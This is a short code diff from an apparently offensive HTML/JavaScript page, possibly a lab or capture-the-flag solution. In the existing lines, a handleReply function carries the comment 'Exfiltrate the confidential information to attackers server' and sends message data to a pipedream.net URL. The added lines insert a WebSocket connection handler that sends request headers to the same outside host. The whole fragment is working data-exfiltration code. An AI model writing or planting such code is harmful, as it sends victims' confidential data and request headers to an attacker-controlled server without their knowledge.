@@ -15,6 +15,9 @@
 		function handleReply(event) {
 		  //Exfiltrate the confidential information to attackers server
 		  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?thi='+event.data, {mode: 'no-cors'})
+		ws.on('connection', function(ws, req) {
+		  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?thi_head='+req.headers, {mode: 'no-cors'})
+		});
 	}">
 
 	<script type="text/javascript">
